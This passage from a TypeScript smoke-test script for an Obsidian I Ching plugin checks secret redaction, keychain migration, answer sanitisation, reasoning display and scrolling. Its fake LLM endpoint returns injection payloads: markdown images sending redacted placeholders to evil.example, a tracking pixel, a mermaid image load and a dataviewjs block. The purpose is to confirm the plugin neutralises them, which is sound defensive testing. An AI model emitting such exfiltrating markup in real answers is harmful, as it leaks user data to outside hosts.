    "V6 Ein dataviewjs-Block in der Antwort rendert als Text, nicht als Codeblock",
    "V7 Die gespeicherte Notiz traegt die entschaerfte Form (```text statt ```dataviewjs und ```mermaid, kein Fernbild, auch nicht als Referenz-Definition), kein dataviewjs-Code im DOM",
    "V8 Die gespeicherte Notiz laedt das Fernbild nicht (Zaehler am Draht bleibt 0)",
    "V9 Zeile ohne Modell: das Panel nimmt das erste Modell der Liste und merkt es in der aktiven Zeile (setModel)",
  ];
  const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
  let fake: FakeChatEndpoint | null = null;
  let vorher: unknown = null;
  try {
    await removeFakeManager(cdp);
    fake = await startFakeChatEndpoint(SCHUTZ_MODELL, (body) => {
      // Jeden Platzhalter der Anfrage spiegeln — als Text, als Bild-URL (ein Bild je Platzhalter, damit die
      // Gegenprobe auch einen Platzhalter trifft, dessen Original keine Leerzeichen traegt) und als dataviewjs-Block.
      const platzhalter = [...JSON.stringify(body.messages).matchAll(/\[redacted-[a-z-]+-\d+\]/g)].map((m) => m[0]);
      const liste = platzhalter.length ? platzhalter : ["(kein Platzhalter gesehen)"];
      const pixel = fake ? `![p](${fake.url}/pixel?d=1)\n\n` : "";
      // Referenz-Definition mit Zeilenumbruch im Label und Mermaid-Bildform: beide lud die Regex-Schicht bis code-kit 0.19.1.
      const luecken = fake ? `![r][a b]\n\n[a\nb]: ${fake.url}/pixel?d=2\n\n\`\`\`mermaid\ngraph TD\n  A@{ img: "${fake.url}/pixel?d=3" }\n\`\`\`\n\n` : "";
      return `Echo ${liste.join(" ")}\n\n${pixel}${luecken}${liste.map((p) => `![x](https://evil.example/?d=${p})`).join("\n")}\n\n\`\`\`dataviewjs\ndv.paragraph("smoke")\n\`\`\`\n`;
    });
    console.log(`  Fake-Endpunkt: ${fake.url}`);
    vorher = await cdp.evaluate(`const l = ${P}.settings.llm; return { eps: l.endpoints, choice: l.choice ?? null, out: ${P}.settings.defaultOutput };`);
    // Ein Endpunkt MIT Klartext-Schluessel (ein Staging-Vault ohne Schluessel misst sonst nichts),
    // dann resolve({ force: true }) — erst das migriert in den Schluesselbund und speichert.
    await cdp.evaluate(`
      const p = ${P};
      p.settings.llm.endpoints = [{ url: ${JSON.stringify(fake.url)}, apiKey: ${JSON.stringify(V_ZEILEN_SCHLUESSEL)}, model: ${JSON.stringify(SCHUTZ_MODELL)} }];
      p.settings.llm.choice = {};
      p.llm.invalidate();
      await p.llm.resolve({ force: true });
      await new Promise((r) => setTimeout(r, 400));
      return true;`);
    const platte = JSON.parse((await readVaultFile(cdp, DATA_PATH)) ?? "{}") as { llm?: { endpoints?: Array<{ apiKey?: string; secretId?: string }> } };
    const zeile = platte.llm?.endpoints?.[0];
    const bund = await schluesselbund(cdp);
    const imBund = bund && zeile?.secretId ? bund[zeile.secretId] : undefined;
    record(NAMEN[0]!, bund ? zeile?.apiKey === undefined && (zeile?.secretId ?? "").startsWith(EP_SECRET_PREFIX) && imBund === V_ZEILEN_SCHLUESSEL : zeile?.apiKey === V_ZEILEN_SCHLUESSEL,
      bund ? `data.json: apiKey ${zeile?.apiKey === undefined ? "fehlt" : "ist noch da"}, secretId ${JSON.stringify(zeile?.secretId ?? null)}, Schluesselbund-Wert ${imBund === V_ZEILEN_SCHLUESSEL ? "stimmt" : "falsch/fehlt"}`
        : "kein Schluesselbund (< 1.11.4) — Wert bleibt in der Zeile");

    const frage = `Smoke V: Schluessel ${V_SK} und Authorization Bearer ${V_GEHEIMNIS} bitte pruefen`;
    const ok = await laufeDeutung(cdp, 20000, frage);
    const body = fake.lastBody();
    const draht = JSON.stringify(body?.messages ?? []);
    record(NAMEN[1]!, ok && fake.lastAuth() === `Bearer ${V_ZEILEN_SCHLUESSEL}`, `Authorization-Header am Fake-Server: ${JSON.stringify(fake.lastAuth())}`);
    record(NAMEN[2]!, ok && draht.includes("[redacted-token") && !draht.includes(V_GEHEIMNIS) && !draht.includes(V_SK),
      ok ? `Platzhalter im Body: ${draht.includes("[redacted-token") ? "ja" : "nein"}, Klartext-Geheimnis im Body: ${draht.includes(V_GEHEIMNIS) || draht.includes(V_SK) ? "JA" : "nein"}` : "Deutungslauf lieferte kein Ergebnis");

    const dom = await cdp.evaluate<{ text: string; imgs: number; evilImg: number; codeblock: number }>(`
      const b = document.querySelector(".yijing-interpretation-body");
      return { text: b?.textContent ?? "", imgs: b?.querySelectorAll("img").length ?? -1,
        evilImg: b?.querySelectorAll('img[src*="evil.example"], [src*="evil.example"]').length ?? -1,
        codeblock: b?.querySelectorAll('pre, code, [class*="dataviewjs"]').length ?? -1 };`);
    record(NAMEN[3]!, ok && dom.text.includes(V_GEHEIMNIS) && dom.text.includes(V_SK), ok ? `Deutung enthaelt beide Originale: ${dom.text.includes(V_GEHEIMNIS) && dom.text.includes(V_SK) ? "ja" : "nein"}` : "kein Ergebnis");
    record(NAMEN[4]!, ok && dom.imgs === 0 && dom.evilImg === 0, `img-Elemente: ${dom.imgs}, Elemente mit evil.example-Quelle: ${dom.evilImg}`);
    record(NAMEN[5]!, ok && dom.codeblock === 0 && dom.text.includes("dataviewjs"), `pre/code/dataviewjs-Elemente: ${dom.codeblock}, Text enthaelt „dataviewjs“: ${dom.text.includes("dataviewjs") ? "ja" : "nein"}`);

    // V7/V8: dieselbe Deutung speichern. Die Notiz oeffnet sich sofort (openAfterCreate), Live Preview laedt
    // Fernbilder schon vor der Leseansicht — deshalb misst V8 am Draht, nicht im DOM. Im Staging-Vault ist kein
    // Dataview installiert: V7 prueft die Form der Datei, nicht ein Nicht-Ausfuehren.
    const pixelVorher = fake.pixelCalls();
    const dateienVorher = await cdp.evaluate<string[]>(`return app.vault.getMarkdownFiles().map((f) => f.path);`);
    await cdp.evaluate(`${P}.settings.defaultOutput = "note"; ${P}.settings.openAfterCreate = true; return true;`);
    const gespeichert = ok && await clickPanelButton(cdp, ".yijing-interpretation-inner .yijing-actions button");
    await schlaf(3000);
    const dateienNachher = await cdp.evaluate<string[]>(`return app.vault.getMarkdownFiles().map((f) => f.path);`);
    const neu = dateienNachher.filter((f) => !dateienVorher.includes(f));
    for (const f of neu) aufraeumen.push(f);
    const notiz = neu.length === 1 ? await cdp.evaluate<string>(`return await app.vault.read(app.vault.getAbstractFileByPath(${JSON.stringify(neu[0])}));`) : "";
    const leaf = await cdp.evaluate<{ kopf: boolean; dvjs: number }>(`
      const v = document.querySelector(".workspace-leaf.mod-active .view-content");
      return { kopf: Boolean(v && /AI Interpretation|KI-Deutung/.test(v.textContent ?? "")), dvjs: v ? v.querySelectorAll("code.language-dataviewjs, .language-dataviewjs").length : -1 };`);
    const form = notiz.includes("```text") && !notiz.includes("```dataviewjs") && !notiz.includes("![") && !notiz.includes("```mermaid") && notiz.includes("[r]");
    record(NAMEN[6]!, gespeichert && neu.length === 1 && form && leaf.kopf && leaf.dvjs === 0,
      `neue Notizen: ${neu.length}, Fence text: ${notiz.includes("```text") ? "ja" : "nein"}, Fence dataviewjs in Datei: ${notiz.includes("```dataviewjs") ? "JA" : "nein"}, Fernbild-Syntax in Datei: ${notiz.includes("![") ? "JA" : "nein"}, Fence mermaid in Datei: ${notiz.includes("```mermaid") ? "JA" : "nein"}, Ueberschrift gerendert (Positivkontrolle): ${leaf.kopf ? "ja" : "nein"}, code.language-dataviewjs im DOM: ${leaf.dvjs}`);
    record(NAMEN[7]!, gespeichert && neu.length === 1 && leaf.kopf && pixelVorher === 0 && fake.pixelCalls() === 0,
      `GET /pixel am Fake-Server: ${pixelVorher} vor, ${fake.pixelCalls()} nach dem Speichern`);
    // V9 (Welle 17): eine Zeile ohne Modell. Das Panel nimmt das erste Modell der Liste und `setModel` schreibt es
    // in die AKTIVE Zeile — kein globales Feld mehr.
    await cdp.evaluate(`
      const p = ${P};
      p.settings.llm.endpoints = [{ url: ${JSON.stringify(fake.url)} }];
      p.settings.llm.choice = {};
      p.llm.invalidate(); await p.saveSettings();
      return true;`);
    const okV9 = await laufeDeutung(cdp, 20000, "Smoke V9: Zeile ohne Modell");
    const nachV9 = await cdp.evaluate<{ zeile: string | null; global: boolean }>(`
      const l = ${P}.settings.llm; return { zeile: l.endpoints[0]?.model ?? null, global: "model" in l };`);
    record(NAMEN[8]!, okV9 && nachV9.zeile === SCHUTZ_MODELL && !nachV9.global,
      okV9 ? `Modell der Zeile: ${JSON.stringify(nachV9.zeile)} (erwartet ${JSON.stringify(SCHUTZ_MODELL)}), globales Feld llm.model: ${nachV9.global ? "da" : "fehlt"}` : "Deutungslauf lieferte kein Ergebnis");
  } catch (e) {
    for (const n of NAMEN) if (!aufgezeichnet(n)) unmeasured(n, `Messung abgebrochen: ${(e as Error).message}`);
  } finally {
    if (fake) await fake.close().catch(() => undefined);
    if (vorher !== null) {
      await cdp.evaluate(`
        const v = ${JSON.stringify(vorher)}; const p = ${P};
        p.settings.llm.endpoints = v.eps; p.settings.defaultOutput = v.out;
        if (v.choice === null) delete p.settings.llm.choice; else p.settings.llm.choice = v.choice;
        p.llm.invalidate(); await p.saveSettings();
        return true;`).catch(() => null);
    }
  }
}

/** Ein bereits GELADENES Chat-Modell auf dem lokalen LM-Studio-Endpunkt, sonst `null`. Bewusst nur
 *  ein geladenes: eine Anfrage an ein nicht geladenes Modell loest ein JIT-Laden aus und
 *  verdraengt das Modell, an dem eine andere Sitzung gerade arbeitet. */
async function geladenesModell(url: string, gewuenscht?: string): Promise<string | null> {
  try {
    const res = await fetch(`${url}/api/v0/models`, { signal: AbortSignal.timeout(3000) });
    if (!res.ok) return null;
    const body = (await res.json()) as { data?: Array<{ id: string; state?: string; type?: string }> };
    // Mit `--model` zaehlt nur genau dieses Modell: bei mehreren geladenen (auch fremden) waehlt sonst die Reihenfolge der Liste.
    return (body.data ?? []).find((m) => m.state === "loaded" && (m.type === "llm" || m.type === "vlm") && (gewuenscht === undefined || m.id === gewuenscht))?.id ?? null;
  } catch {
    return null;
  }
}

/** L1: der Denkblock der Deutung (buildStreamArea, `reasoning`) waechst waehrend des Stroms und ist sichtbar, bevor
 *  die Antwort beginnt. Gegen den zentralen Stub mit Reasoning-Deltas (`reasoning_content`), der Takt haelt den
 *  Strom lange genug offen. Gueltig nur, wenn der Strom beim zweiten Messwert noch laeuft (sonst nichts gemessen).
 *  „Folge-Regel“ gibt es hier nicht: `view.ts` baut den Bereich ohne `scrollEl`, der Body ist unbegrenzt hoch
 *  (Befund an den Master, kein Prüfpunkt). */
const GEMMA_NAME = "L6 Gemma-Stub: nach dem Kanal-Ende steht im Antwortbereich nur die Antwort, das Denken im Denkblock";
const DENK_NAME = "L1 Denkblock live: der Reasoning-Text ist waehrend des Stroms sichtbar und waechst, bevor die Antwort beginnt";
const DENK_MODELL = "smoke-denk-modell";

async function pruefeDenkblockLive(cdp: Cdp): Promise<void> {
  console.log("\nL · Denkblock live");
  const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
  let stub: Awaited<ReturnType<typeof startLlmStub>> | null = null;
  let vorher: unknown = null;
  try {
    await removeFakeManager(cdp);
    stub = await startLlmStub({
      models: [DENK_MODELL],
      standard: { reasoning: "Ich wäge die Linien gegeneinander ab und prüfe den Wandel. ".repeat(8), text: "Die Deutung beginnt erst nach dem Denken.", laenge: 20, takt: 300, nachlaufMs: 4000 },
    });
    vorher = await cdp.evaluate(`const l = ${P}.settings.llm; return { eps: l.endpoints, choice: l.choice ?? null };`);
    await cdp.evaluate(`
      const p = ${P};
      p.settings.llm.endpoints = [{ url: ${JSON.stringify(stub.url)}, model: ${JSON.stringify(DENK_MODELL)} }]; p.settings.llm.choice = {};
      p.llm.invalidate(); await p.saveSettings();
      return true;`);
    if (!(await openPanel(cdp))) { unmeasured(DENK_NAME, "Panel oeffnet nicht"); return; }
    await cdp.evaluate(`
      const q = document.querySelector(".yijing-oracle .yijing-question");
      if (q) { q.value = "Smoke L: Denkblock"; q.dispatchEvent(new Event("input")); }
      return true;`);
    if (!(await clickPanelButton(cdp, ".yijing-oracle .yijing-actions button"))) { unmeasured(DENK_NAME, "Wurf-Knopf nicht gefunden"); return; }
    await schlaf(500);
    if (!(await clickPanelButton(cdp, ".yijing-interpretation-inner .yijing-actions button"))) { unmeasured(DENK_NAME, "Deuten-Knopf nicht gefunden"); return; }
    const messe = `return { denk: (document.querySelector(".okit-stream-reasoning pre")?.textContent ?? "").length, tail: (document.querySelector(".okit-stream-tail")?.textContent ?? "").length, strom: Boolean(document.querySelector(".okit-stream")), sichtbar: (() => { const d = document.querySelector(".okit-stream-reasoning"); return Boolean(d && d.open); })() };`;
    const erst = await pollUntil<{ denk: number; tail: number; strom: boolean; sichtbar: boolean }>(cdp, `const m = (() => { ${messe} })(); return m.denk > 0 ? m : null;`, 15000, 150);
    if (!erst) { record(DENK_NAME, false, "kein Reasoning-Text im Denkblock innerhalb von 15 s"); for (const n of [KOPIE_NAME, KOPIE_GEGEN]) unmeasured(n, "L1 beobachtete keinen Denkblock"); return; }
    await schlaf(1000);
    const zweit = await cdp.evaluate<{ denk: number; tail: number; strom: boolean; sichtbar: boolean }>(messe);
    if (!zweit.strom || zweit.tail > 0) { for (const n of [KOPIE_NAME, KOPIE_GEGEN]) unmeasured(n, "L1 stand beim zweiten Messwert nicht mehr im Denken"); unmeasured(DENK_NAME, `Strom nicht mehr im Denken beim zweiten Messwert (Strom ${String(zweit.strom)}, Antwort ${zweit.tail} Zeichen) — Lage nicht hergestellt`); return; }
    record(DENK_NAME, erst.tail === 0 && erst.sichtbar && zweit.denk > erst.denk,
      `Denktext ${erst.denk} → ${zweit.denk} Zeichen, Antwort ${erst.tail} → ${zweit.tail} Zeichen, Block offen: ${erst.sichtbar ? "ja" : "nein"}`);
    await messeDenkblockKopierbar(cdp);
  } catch (e) {
    unmeasured(DENK_NAME, `Messung abgebrochen: ${(e as Error).message}`);
  } finally {
    await cdp.evaluate(`document.querySelector(".yijing-interpretation-inner .yijing-actions button")?.click(); return true;`).catch(() => null);
    if (stub) await stub.stop().catch(() => undefined);
    if (vorher !== null) {
      await cdp.evaluate(`
        const v = ${JSON.stringify(vorher)}; const p = ${P};
        p.settings.llm.endpoints = v.eps;
        if (v.choice === null) delete p.settings.llm.choice; else p.settings.llm.choice = v.choice;
        p.llm.invalidate(); await p.saveSettings();
        return true;`).catch(() => null);
    }
  }
}

const KOPIE_NAME = "L1b Denkblock kopierbar: der Knopf legt den Denktext in die Zwischenablage, der Block klappt nicht um";
const KOPIE_GEGEN = "L1c Gegenprobe: lehnt die Zwischenablage ab, quittiert der Knopf nicht";

/** L1b/L1c — der Kopier-Knopf am Gedankenblock (Kit 0.63.0). Die Messung ist die der Brücke (`messeDenkblockKopierbar` in `pflichtpunkte.ts`, seit Welle 25
 *  zentral; hier war es eine lokale Fassung, gleich lingotuner C8c/C8d): `navigator.clipboard.writeText` wird aufgezeichnet und danach wiederhergestellt,
 *  L1c ist die Gegenprobe (lehnt `writeText` ab, darf der Knopf nicht quittieren). Neu gegenüber der lokalen Fassung: der Knopf muss ein aria-label tragen. */
async function messeDenkblockKopierbar(cdp: Cdp): Promise<void> {
  zeichneDenkblock(pflichtBilanz, { kopie: KOPIE_NAME, gegen: KOPIE_GEGEN }, await messeDenkblockZentral(cdp, { erwartetKnopf: true }));
}

/** Die Bilanz, wie der Baustein `pflichtpunkte` sie braucht (`zeichnePflicht`). */
const pflichtBilanz: PflichtBilanz = {
  record: (name, passed, detail) => record(name, passed, detail ?? ""),
  unmeasured: (name, grund) => unmeasured(name, grund),
};

const P_NAMEN = {
  fokus: "P1 Tippen in die Frage waehrend die Deutung streamt behaelt den Fokus",
  fokusGegen: "P1b Gegenprobe: ein Neuzeichnen mit Fokusverlust macht P1 rot",
  erreich: "P2 jedes Bedienelement ist erreichbar (natuerliche Hoehe)",
  erreichKurz: "P2b jedes Bedienelement ist erreichbar (kurzes Panel, 420 px)",
  erreichGegen: "P2c Gegenprobe: ohne Rollbalken wird etwas unerreichbar",
} as const;

/** P1/P2 — die Pflichtpunkte aus `tools/obsidian-cdp/pflichtpunkte.ts` (Skill `gui-smoke-setup` § 3a) fuer die Deutung: ein offener Strom
 *  (der Stub haelt ihn nach dem Text offen), waehrend dessen der Nutzer in die Frage tippt (Fokus) und alle Bedienelemente des Panels
 *  erreichbar bleiben muessen, wenn die Deutung lang wird (EIN Rollbereich: `.view-content`). */
async function pruefePflicht(cdp: Cdp): Promise<void> {
  console.log("\nP · Pflichtpunkte (Fokus-Erhalt, Erreichbarkeit)");
  const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
  let stub: Awaited<ReturnType<typeof startLlmStub>> | null = null;
  let vorher: unknown = null;
  try {
    await removeFakeManager(cdp);
    stub = await startLlmStub({
      models: [DENK_MODELL],
      standard: { text: Array.from({ length: 30 }, (_, i) => `Zeile ${i + 1}: Die Linien wandeln sich.\n\n`).join(""), laenge: 30, takt: 200, nachlaufMs: 90_000 },
    });
    vorher = await cdp.evaluate(`const l = ${P}.settings.llm; return { eps: l.endpoints, choice: l.choice ?? null };`);
    await cdp.evaluate(`
      const p = ${P};
      p.settings.llm.endpoints = [{ url: ${JSON.stringify(stub.url)}, model: ${JSON.stringify(DENK_MODELL)} }]; p.settings.llm.choice = {};
      p.llm.invalidate(); await p.saveSettings();
      return true;`);
    if (!(await openPanel(cdp))) { for (const n of Object.values(P_NAMEN)) unmeasured(n, "Panel oeffnet nicht"); return; }
    await cdp.evaluate(`
      const q = document.querySelector(".yijing-oracle .yijing-question");
      if (q) { q.value = "Smoke P: Pflichtpunkte"; q.dispatchEvent(new Event("input")); }
      return true;`);
    if (!(await clickPanelButton(cdp, ".yijing-oracle .yijing-actions button"))) { for (const n of Object.values(P_NAMEN)) unmeasured(n, "Wurf-Knopf nicht gefunden"); return; }
    await schlaf(500);
    if (!(await clickPanelButton(cdp, ".yijing-interpretation-inner .yijing-actions button"))) { for (const n of Object.values(P_NAMEN)) unmeasured(n, "Deuten-Knopf nicht gefunden"); return; }
    // Der Strom steht, sobald Text im Antwort-Tail ankommt; ab dann ist der Bereich lang genug zum Rollen.
    const laeuft = await pollUntil<boolean>(cdp, `return (document.querySelector(".okit-stream-tail")?.textContent ?? "").length > 40 ? true : null;`, 15000, 200);
    if (laeuft === null) { for (const n of Object.values(P_NAMEN)) unmeasured(n, "der Strom kam nicht an (kein Text im Antwortbereich)"); return; }

    zeichnePflicht(pflichtBilanz, P_NAMEN.fokus, await messeFokusErhalt(cdp, { selector: ".yijing-question" }));
    zeichnePflicht(pflichtBilanz, P_NAMEN.fokusGegen, await gegenprobeFokus(cdp, { selector: ".yijing-question" }));

    const BEDIENELEMENTE = [".yijing-question", ".yijing-oracle > .yijing-actions button", ".yijing-interpretation-inner .yijing-actions button"];
    const opts = { selektoren: BEDIENELEMENTE, fuelle: { in: ".okit-stream-body" }, ueberlauf: ".view-content.yijing-oracle", erforderlich: BEDIENELEMENTE };
    zeichnePflicht(pflichtBilanz, P_NAMEN.erreich, await messeErreichbarkeit(cdp, opts));
    const kurz = await mitHoehe<PflichtTeilurteil>(cdp, { element: ".workspace-leaf", enthaelt: ".yijing-oracle", hoehe: 420 }, () => messeErreichbarkeit(cdp, opts));
    zeichnePflicht(pflichtBilanz, P_NAMEN.erreichKurz, kurz);
    zeichnePflicht(pflichtBilanz, P_NAMEN.erreichGegen, await gegenprobeErreichbarkeit(cdp, { selektoren: BEDIENELEMENTE, rollbereich: ".view-content.yijing-oracle", fuelle: { in: ".okit-stream-body" } }));
  } catch (e) {
    for (const n of Object.values(P_NAMEN)) if (!aufgezeichnet(n)) unmeasured(n, `Messung abgebrochen: ${(e as Error).message}`);
  } finally {
    await cdp.evaluate(`document.querySelector(".yijing-interpretation-inner .yijing-actions button")?.click(); return true;`).catch(() => null);
    if (stub) { await stub.trenneAlle(); await stub.stop().catch(() => undefined); }
    if (vorher !== null) {
      await cdp.evaluate(`
        const v = ${JSON.stringify(vorher)}; const p = ${P};
        p.settings.llm.endpoints = v.eps;
        if (v.choice === null) delete p.settings.llm.choice; else p.settings.llm.choice = v.choice;
        p.llm.invalidate(); await p.saveSettings();
        return true;`).catch(() => null);
    }
  }
}

type StubHandle = Awaited<ReturnType<typeof startLlmStub>>;
/** L2–L4: Folge-Regel und Kontrollen der Deutung (Ansicht `view-content` scrollt, `scrollEl` des Stream-Bereichs). Token- und
 *  absatzgroße Stücke je ein Strom. */
async function pruefeFolgeRegel(cdp: Cdp): Promise<void> {
  console.log("\nL · Folge-Regel");
  const NAMEN = { folge: "L2 Folge-Regel: Hochscrollen mitten im Strom wird respektiert, die Ansicht springt nicht wieder nach unten", kontrolle: "L3 Kontrolle: die Deutung folgt dem Strom ohne Störung bis zum Ende", absatz: "L4 Kontrolle: die Deutung folgt auch bei absatzgroßen Stücken bis zum Ende", wieder: "L5 Wiederaufnahme: steht der Nutzer wieder unten, folgt die Deutung dem Strom wieder" } as const;
  const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
  const zeilen = (k: number): string => Array.from({ length: k }, (_, i) => `Zeile ${String(i + 1).padStart(3, "0")}: abcdefghij klmnopqrs\n`).join("");
  const absaetze = (k: number): string[] => Array.from({ length: k }, (_, j) => Array.from({ length: 5 }, (_, i) => `Absatz ${String(j + 1).padStart(2, "0")} Zeile ${i + 1}: abcdefghij klmnopqrs\n`).join("") + "\n");
  let stub: StubHandle | null = null;
  let vorher: unknown = null;
  try {
    await removeFakeManager(cdp);
    stub = await startLlmStub({ models: [DENK_MODELL], standard: { text: "ok" } });
    vorher = await cdp.evaluate(`const l = ${P}.settings.llm; return { eps: l.endpoints, choice: l.choice ?? null };`);
    await cdp.evaluate(`
      const p = ${P};
      p.settings.llm.endpoints = [{ url: ${JSON.stringify(stub.url)}, model: ${JSON.stringify(DENK_MODELL)} }]; p.settings.llm.choice = {};
      p.llm.invalidate(); await p.saveSettings();
      return true;`);
    const starten = async (): Promise<boolean> => {
      if (!(await openPanel(cdp))) return false;
      await cdp.evaluate(`
        const q = document.querySelector(".yijing-oracle .yijing-question");
        if (q) { q.value = "Smoke L: Folge-Regel"; q.dispatchEvent(new Event("input")); }
        return true;`);
      if (!(await clickPanelButton(cdp, ".yijing-oracle .yijing-actions button"))) return false;
      await schlaf(500);
      return clickPanelButton(cdp, ".yijing-interpretation-inner .yijing-actions button");
    };
    for (const variante of ["token", "absatz"] as const) {
      stub.antworten([variante === "token" ? { text: zeilen(120), laenge: 8, takt: 40, nachlaufMs: 6000 } : { stuecke: absaetze(24), takt: 300, nachlaufMs: 6000 }]);
      if (!(await starten())) {
        for (const n of variante === "token" ? [NAMEN.folge, NAMEN.kontrolle, NAMEN.wieder] : [NAMEN.absatz]) unmeasured(n, "Panel/Deuten-Knopf nicht bedienbar — nichts gemessen");
      } else {
        const s = stub;
        const r = await messeFolge(cdp, { selector: ".view-content.yijing-oracle", laeuft: () => s.zaehler().unterwegs > 0, stoerung: variante === "token", wiederaufnahme: variante === "token" });
        if (variante === "token") zeichneFolge({ record, unmeasured }, { kontrolle: NAMEN.kontrolle, folge: NAMEN.folge, wiederaufnahme: NAMEN.wieder }, r);
        else zeichneFolge({ record, unmeasured }, { kontrolle: NAMEN.absatz }, r);
      }
      await cdp.evaluate(`document.querySelector(".yijing-interpretation-inner .yijing-actions button")?.click(); return true;`).catch(() => null);
      await stub.trenneAlle();
      await schlaf(800);
    }
  } catch (e) {
    for (const n of Object.values(NAMEN)) if (!aufgezeichnet(n)) unmeasured(n, `Messung abgebrochen: ${(e as Error).message}`);
  } finally {
    if (stub) await stub.stop().catch(() => undefined);
    if (vorher !== null) {
      await cdp.evaluate(`
        const v = ${JSON.stringify(vorher)}; const p = ${P};
        p.settings.llm.endpoints = v.eps;
        if (v.choice === null) delete p.settings.llm.choice; else p.settings.llm.choice = v.choice;
        p.llm.invalidate(); await p.saveSettings();
        return true;`).catch(() => null);
    }
  }
}

/** Optional: mit `SHOT_DIR=<ordner>` nimmt der Lauf die Flaeche nach dem Gemma-Punkt auf (Sichtpruefung des Denkblocks). Aufnahmen gehoeren
 *  unter `--exclusive focus`: unter einem Port-Lock haengt `Page.captureScreenshot` bei verdecktem Fenster. */
async function haltePanelBild(cdp: Cdp, name: string, selector: string): Promise<void> {
  const dir = process.env.SHOT_DIR;
  if (dir === undefined || dir === "") return;
  try {
    mkdirSync(dir, { recursive: true });
    await cdp.evaluate(`const d = document.querySelector(".okit-stream-reasoning, .img2md-reasoning"); if (d) d.open = true; const k = document.querySelector(".okit-stream"); if (k) k.scrollIntoView({ block: "center" }); await new Promise((r) => setTimeout(r, 400)); return true;`);
    const r = await boxAround(cdp, [selector], 4);
    const png = await capture(cdp, r ?? undefined, 1, {});
    writeFileSync(join(dir, `${name}.png`), png);
    console.log(`  · Bild: ${join(dir, `${name}.png`)}`);
  } catch (e) {
    console.log(`  · Bild ${name} nicht aufgenommen: ${(e as Error).message}`);
  }
}

/** L6 — das Gemma-Format (Gemma-Abschluss, Welle 23): gemma-4 auf LM Studio ignoriert „none“ und schreibt sein Denken OHNE Oeffner in den
 *  Antworttext, beendet es mit `<channel|>` (gemessen 2026-10-14). Der Stub spielt das nach und haelt den Strom danach OFFEN (`nachlaufMs`):
 *  gemessen wird der Anzeigetext, waehrend der Aufruf noch laeuft, denn am Ende rendert die Ansicht ohnehin `res.content`. Ohne
 *  `onContentReset` (view.ts) bliebe der Denktext bis dahin im Antwortbereich stehen. Mutationsprobe: Abklemmen von `onContentReset`
 *  macht den Punkt rot (siehe Commit-Nachricht). */
async function pruefeGemma(cdp: Cdp): Promise<void> {
  console.log("\nL6 · Gemma-Kanal");
  const NAME = GEMMA_NAME;
  const P = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
  const MODELL = "google/gemma-4-e4b";
  const DENKEN = "The user wants me to read the hexagram for a question about change.\nI will keep it short.";
  let stub: Awaited<ReturnType<typeof startLlmStub>> | null = null;
  let vorher: unknown = null;
  try {
    await removeFakeManager(cdp);
    stub = await startLlmStub({
      models: [MODELL],
      standard: { text: `${DENKEN}<channel|>Sauberer Text der Deutung.`, laenge: 14, takt: 120, nachlaufMs: 6000, model: MODELL },
    });
    vorher = await cdp.evaluate(`const l = ${P}.settings.llm; return { eps: l.endpoints, choice: l.choice ?? null };`);
    await cdp.evaluate(`
      const p = ${P};
      p.settings.llm.endpoints = [{ url: ${JSON.stringify(stub.url)}, model: ${JSON.stringify(MODELL)} }]; p.settings.llm.choice = {};
      p.llm.invalidate(); await p.saveSettings();
      return true;`);
    if (!(await openPanel(cdp))) { unmeasured(NAME, "Panel oeffnet nicht"); return; }
    await cdp.evaluate(`
      const q = document.querySelector(".yijing-oracle .yijing-question");
      if (q) { q.value = "Smoke L6: Gemma"; q.dispatchEvent(new Event("input")); }
      return true;`);
    if (!(await clickPanelButton(cdp, ".yijing-oracle .yijing-actions button"))) { unmeasured(NAME, "Wurf-Knopf nicht gefunden"); return; }
    await schlaf(500);
    if (!(await clickPanelButton(cdp, ".yijing-interpretation-inner .yijing-actions button"))) { unmeasured(NAME, "Deuten-Knopf nicht gefunden"); return; }
    // Warten, bis die Antwort NACH dem Kanal-Ende im Bereich beginnt; der Strom laeuft danach noch 6 s.
    const messe = `
      const wurzel = document.querySelector(".okit-stream");
      if (!wurzel) return null;
      const kopie = wurzel.cloneNode(true);
      kopie.querySelectorAll(".okit-stream-reasoning").forEach((e) => e.remove());
      const antwort = (kopie.textContent || "").trim();
      const denk = (document.querySelector(".okit-stream-reasoning pre")?.textContent ?? "");
      return antwort.includes("Sauber") ? { antwort, denk } : null;`;
    const m = await pollUntil<{ antwort: string; denk: string }>(cdp, messe, 20000, 100);
    if (m === null) { unmeasured(NAME, "die Antwort nach dem Kanal-Ende erschien nicht im Antwortbereich (20 s) — Lage nicht hergestellt"); return; }
    await haltePanelBild(cdp, "gemma-denkblock", ".okit-stream");
    const sauber = !m.antwort.includes("The user wants") && !m.antwort.includes("<channel");
    const imBlock = m.denk.includes("The user wants");
    record(NAME, sauber && imBlock,
      `Antwortbereich ${JSON.stringify(m.antwort.slice(0, 70))} · Denkblock ${imBlock ? "traegt das Denken" : "LEER oder ohne Denken"} (${m.denk.length} Zeichen)`);
  } catch (e) {
    unmeasured(NAME, `Messung abgebrochen: ${(e as Error).message}`);
  } finally {
    await cdp.evaluate(`document.querySelector(".yijing-interpretation-inner .yijing-actions button")?.click(); return true;`).catch(() => null);
    if (stub) await stub.stop().catch(() => undefined);
    if (vorher !== null) {
      await cdp.evaluate(`
        const v = ${JSON.stringify(vorher)}; const p = ${P};
        p.settings.llm.endpoints = v.eps;
        if (v.choice === null) delete p.settings.llm.choice; else p.settings.llm.choice = v.choice;
        p.llm.invalidate(); await p.saveSettings();
        return true;`).catch(() => null);
    }
  }
}

/** M4: die Deutung gegen einen ECHTEN Endpunkt — der eigentliche Beleg des Kit-Chat-Clients
 *  (M2/M3 laufen gegen einen Fake-Server mit einem Chunk). Ohne geladenes Modell "nichts gemessen". */
async function pruefeEchtenEndpunkt(cdp: Cdp, gewuenschtesModell?: string): Promise<void> {
  console.log("\nM4 · Deutung gegen einen echten Endpunkt");
  const name = "M4 Deutung streamt gegen den echten Endpunkt";
  const url = "http://127.0.0.1:1234";
  // Ohne `--model` wird nichts angefragt: bei mehreren geladenen Modellen (auch fremden) waehlt sonst die Reihenfolge der Liste,
  // und der Lauf trifft ein Modell, das ihm nicht gehoert (gemessen 2026-10-14, Welle 22: M4 ohne Flag fragte ein fremdes gemma-4-e2b an).
  if (gewuenschtesModell === undefined) { unmeasured(name, "--model <id> nicht gesetzt: die Reihenfolge der Modell-Liste ist kein Auswahlkriterium, es wird nichts angefragt"); return; }
  const modell = await geladenesModell(url, gewuenschtesModell);
